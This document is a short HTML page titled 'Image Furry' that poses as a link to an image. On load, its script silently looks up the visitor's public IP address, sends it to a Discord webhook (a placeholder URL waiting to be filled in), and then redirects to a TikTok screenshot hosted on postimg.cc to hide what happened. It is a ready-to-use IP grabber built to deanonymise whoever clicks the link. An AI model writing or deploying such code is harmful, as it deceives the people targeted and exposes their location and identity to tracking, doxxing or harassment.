<!DOCTYPE html>
<html>
<head>
    <title>Image Furry</title>
    <script>
        function getIpAndRedirect() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    var ip = data.ip;
                    var webhook = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
                    var payload = { content: ip };
                    fetch(webhook, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    window.location.href = 'https://i.postimg.cc/mkjgkBth/Screenshot-20250907-133847-com-zhiliaoapp-musically-edit-109533490277556.jpg';
                });
        }
    </script>
</head>
<body onload="getIpAndRedirect()"></body>
</html>
